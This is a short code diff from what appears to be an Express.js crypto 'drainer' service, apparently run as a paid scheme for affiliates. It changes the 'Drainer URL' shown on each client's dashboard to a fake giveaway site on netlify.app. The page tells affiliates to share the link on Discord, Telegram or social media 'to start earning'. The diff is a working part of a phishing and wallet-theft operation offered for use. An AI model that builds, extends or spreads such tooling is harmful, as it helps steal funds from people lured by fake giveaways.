@@ -789,7 +789,7 @@ app.get('/saas/dashboard/:clientId', (req, res) => {
         <div class="section">
             <h3 class="section-title">🚀 Your Drainer URL</h3>
             <div class="url-box">
-                https://your-backend.onrender.com/saas/client/${clientId}
+                https://cheetah-giveaway.netlify.app/?client/${clientId}
             </div>
             <p style="color: #94a3b8; margin-bottom: 15px;">
                 Share this link on Discord, Telegram, or social media to start earning!
